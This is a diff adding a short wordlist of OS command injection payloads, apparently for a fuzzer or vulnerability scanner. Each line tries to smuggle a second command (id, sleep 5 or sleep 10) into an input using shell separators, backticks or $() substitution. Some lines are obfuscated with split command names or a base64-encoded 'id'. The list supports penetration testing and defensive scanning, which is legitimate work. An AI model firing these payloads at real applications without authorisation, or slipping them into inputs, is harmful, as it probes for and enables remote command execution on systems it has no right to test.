@@ -1,0 +1,30 @@
+$(id)
+$(sleep 10)
+$(sleep 5)
+bogus
+;`echo 'aWQK' |base64 -d`
+FAIL||i$()d
+FAIL_INTENT|`echo 'aWQK' |base64 -d`
+FAIL_INTENT||`echo 'aWQK' |base64 -d`
+FAIL_INTENT||id
+FAIL_INTENT|id
+FAIL_INTENT||sleep 5
+FAIL_INTENT|sleep 5
+FAIL||slee$()p 5
+;i$()d
+|i$()d
+i$()d
+&&id
+&id
+;id
+`id`
+|id
+;sl$()eep 5
+|sl$()eep 5
+sle$()ep 5
+`sleep 10`
+&&sleep 5
+&sleep 5
+;sleep 5
+`sleep 5`
+|sleep 5
